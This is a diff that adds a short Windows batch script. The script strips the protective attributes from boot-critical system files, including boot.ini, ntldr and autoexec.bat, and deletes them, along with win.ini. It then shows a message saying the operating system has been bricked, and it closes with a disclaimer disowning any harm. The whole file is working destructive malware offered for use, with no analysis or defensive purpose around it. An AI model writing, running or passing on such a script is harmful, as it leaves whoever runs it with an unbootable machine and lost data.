@@ -1,0 +1,15 @@
+@echo off
+attrib -r -s -h C:\autoexec.bat
+del C:\autoexec.bat
+attrib -r -s -h C:\boot.ini
+del C:\boot.ini
+attrib -r -s -h C:\ntldr
+del C:\ntldr
+attrib -r -s -h C:\window\win.ini
+del C:\window\win.ini
+@echo off
+msg* <You're OS has been bricked! Please restart your desktop for the changes to take effect.>
+
+
+:: Disclaimer we are not responsible for any harm done to your computer. Run this file at your own risk.
+:: Steelneel Tech 2022
